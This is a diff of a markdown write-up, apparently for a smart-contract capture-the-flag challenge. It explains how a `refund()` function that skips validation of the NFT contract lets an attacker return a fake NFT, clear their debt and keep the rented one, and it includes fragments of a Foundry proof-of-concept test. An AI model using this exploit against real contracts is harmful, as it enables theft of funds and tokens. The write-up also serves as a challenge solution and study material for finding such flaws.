@@ -3,7 +3,7 @@
 ## Description
 
 `refund()` function lacks the check if anyone is adding a fake NFT.
- 
+
 An Attacker can create a fake NFT contract and call the `refund` with the new NFT deails which clear out his debt.
 
 Attack Steps:
@@ -24,11 +24,9 @@ for (uint i; i < rentNFTs.length; i++) {
         }
 ```
 
-
-
 ---
 
-## POC:
+## PoC:
 
 ```solidity
 
@@ -76,8 +74,8 @@ contract NFTBankHack is Test {
         vm.startPrank(attacker);
         bank.rent{value: 500 gwei}(address(meow), 1);
         vm.warp(block.timestamp + 86400 * 10);
-        
-        //solution  
+
+        //solution
 
         CryptoDoggies dog;
         dog = new CryptoDoggies();
@@ -88,7 +86,7 @@ contract NFTBankHack is Test {
         bank.refund(address(dog), 2);
 
         vm.stopPrank();
-        
+
         assertEq(attacker.balance, 1 ether);
         assertEq(meow.ownerOf(1), attacker);
     }
